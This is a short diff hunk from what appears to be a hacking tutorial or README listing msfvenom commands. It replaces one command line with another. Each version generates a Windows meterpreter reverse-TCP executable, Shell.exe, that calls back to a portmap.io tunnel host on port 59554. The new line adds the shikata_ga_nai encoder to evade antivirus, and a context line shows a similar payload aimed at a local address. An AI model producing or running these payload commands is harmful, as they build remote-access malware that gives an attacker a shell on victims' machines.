@@ -24,7 +24,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.2.15 LPORT=7229 -a x86 -f
 
 OR
 
-msfvenom -p windows/meterpreter/reverse_tcp -e x86/Hackeraj_Virus_Alert -i 5 -b '\x00' LHOST=Hackeraj-59554.portmap.io LPORT=59554 -f exe > /root/Desktop/Shell.exe
+msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 3 -b '\x00' LHOST=Hackeraj-59554.portmap.io LPORT=59554 -f exe > /root/Desktop/Shell.exe
 ```
 Mac:
 ```
